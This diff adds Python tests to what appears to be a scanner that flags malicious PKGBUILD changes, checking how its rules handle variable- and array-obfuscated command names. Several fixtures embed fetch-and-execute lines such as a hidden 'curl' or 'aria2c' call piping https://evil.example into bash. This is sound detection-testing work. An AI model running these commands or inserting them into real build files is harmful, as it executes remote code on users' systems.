@@ -115,6 +115,46 @@ def test_x002_stands_down_when_the_tokenizer_resolved_the_name():
     assert "R001" in fired, "the resolved payload must still be caught"
 
 
+def test_x002_stands_down_for_a_resolved_array_element():
+    """`A=(curl)` then `${A[0]}` resolves the same way a scalar does.
+
+    The array table is part of what the tokenizer can read, so the static
+    subscript is a spelling choice; only an unresolved subscript is X002's.
+    """
+    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,5 @@\n build() {\n"
+            "+  A=(curl)\n+  ${A[0]} -fsSL https://evil.example | bash\n }\n")
+    assert "X002" not in set(crossfire_techniques(diff))
+
+    fired = {e.rule_id for e in scan_diff(diff, package_name="p").score_breakdown}
+    assert "R001" in fired, "the resolved payload must still be caught"
+
+
+def test_x002_still_fires_on_a_dynamic_array_subscript():
+    """`${A[$i]}` does not resolve, so the command name stays hidden."""
+    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,5 @@\n build() {\n"
+            "+  A=(curl)\n+  ${A[$i]} -fsSL https://evil.example | bash\n }\n")
+    assert "X002" in set(crossfire_techniques(diff))
+
+
+def test_x023_stands_down_when_resolution_names_the_fetch():
+    """The pipeline rules read the resolved text: `C=curl` is R001's."""
+    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,5 @@\n build() {\n"
+            "+  C=curl\n+  $C -fsSL https://evil.example | bash\n }\n")
+    assert "X023" not in set(crossfire_techniques(diff))
+
+    fired = {e.rule_id for e in scan_diff(diff, package_name="p").score_breakdown}
+    assert "R001" in fired
+
+
+def test_x009_claims_a_resolved_uncatalogued_fetch():
+    """`C=aria2c` is a fetch after resolution, and X009 owns it, not X023."""
+    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,5 @@\n build() {\n"
+            "+  C=aria2c\n+  $C -fsSL https://evil.example | bash\n }\n")
+    techniques = set(crossfire_techniques(diff))
+    assert "X009" in techniques
+    assert "X023" not in techniques
+
+
 NOT_COMMANDS = [
     # Each of these fired on the benign corpus before it was excluded.
     ("assignment-rhs",     'font=`grep -o -e "THE FONT" License.rtf | head -1`'),
